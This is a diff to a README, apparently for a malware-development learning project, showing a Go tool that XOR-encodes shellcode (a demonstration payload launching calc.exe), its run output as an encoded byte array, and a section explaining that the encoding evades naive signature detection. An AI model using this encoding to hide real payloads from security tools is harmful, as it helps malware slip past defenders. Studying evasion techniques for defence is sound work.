@@ -43,17 +43,36 @@ A?8?u?LLE9?u?XD?@$I?fA?H?P?HD?@ I??VH??A?4?H?M1?H1??A??
 ???u?GrojYA????calc.exe⏎    
 
 ```
+## Run the encryptor
+```bash
+kant@APPLEs-MacBook-Pro ~/e/shellcode> ls
+Xor-Enc/             clean-shellcode.bin  go.mod
+kant@APPLEs-MacBook-Pro ~/e/shellcode> go build -o enc Xor-Enc/main.go 
+kant@APPLEs-MacBook-Pro ~/e/shellcode> ls
+Xor-Enc/             clean-shellcode.bin  enc*                 go.mod
+kant@APPLEs-MacBook-Pro ~/e/shellcode> ./enc -h
+Usage of ./enc:
+  -file string
+    	Path Of the Shellcode
+kant@APPLEs-MacBook-Pro ~/e/shellcode> ./enc -file=clean-shellcode.bin 
+[]byte{121, 205, 6, 97, 117, 109, 69, 133, 133, 133, 196, 212, 196, 213, 215, 212, 211, 205, 180, 87, 224, 205, 14, 215, 229, 205, 14, 215, 157, 205, 14, 215, 165, 205, 14, 247, 213, 205, 138, 50, 207, 207, 200, 180, 76, 205, 180, 69, 41, 185, 228, 249, 135, 169, 165, 196, 68, 76, 136, 196, 132, 68, 103, 104, 215, 196, 212, 205, 14, 215, 165, 14, 199, 185, 205, 132, 85, 14, 5, 13, 133, 133, 133, 205, 0, 69, 241, 226, 205, 132, 85, 213, 14, 205, 157, 193, 14, 197, 165, 204, 132, 85, 102, 211, 205, 122, 76, 196, 14, 177, 13, 205, 132, 83, 200, 180, 76, 205, 180, 69, 41, 196, 68, 76, 136, 196, 132, 68, 189, 101, 240, 116, 201, 134, 201, 161, 141, 192, 188, 84, 240, 93, 221, 193, 14, 197, 161, 204, 132, 85, 227, 196, 14, 137, 205, 193, 14, 197, 153, 204, 132, 85, 196, 14, 129, 13, 205, 132, 85, 196, 221, 196, 221, 219, 220, 223, 196, 221, 196, 220, 196, 223, 205, 6, 105, 165, 196, 215, 122, 101, 221, 196, 220, 223, 205, 14, 151, 108, 210, 122, 122, 122, 216, 205, 63, 132, 133, 133, 133, 133, 133, 133, 133, 205, 8, 8, 132, 132, 133, 133, 196, 63, 180, 14, 234, 2, 122, 80, 62, 117, 48, 39, 211, 196, 63, 35, 16, 56, 24, 122, 80, 205, 6, 65, 173, 185, 131, 249, 143, 5, 126, 101, 240, 128, 62, 194, 150, 247, 234, 239, 133, 220, 196, 12, 95, 122, 80, 230, 228, 233, 230, 171, 224, 253, 224, 133 }
+kant@APPLEs-MacBook-Pro ~/e/shellcode> 
 
+```
 
+## 🌐 Why XOR?
 
+XOR encryption is one of the oldest tricks in the book for malware authors:
 
+🔀 Obfuscation → Avoids plain-text shellcode detection.
 
+🕵️ Evasion → Helps bypass naive string signatures.
 
+⚡ Fast & Lightweight → Single CPU instruction per byte.
 
+🧩 Easy Integration → Works across any language/runtime.
 
-
-
-
+Of course, advanced security tools can still catch this — but it’s a first step in maldev learning.
 
 
 
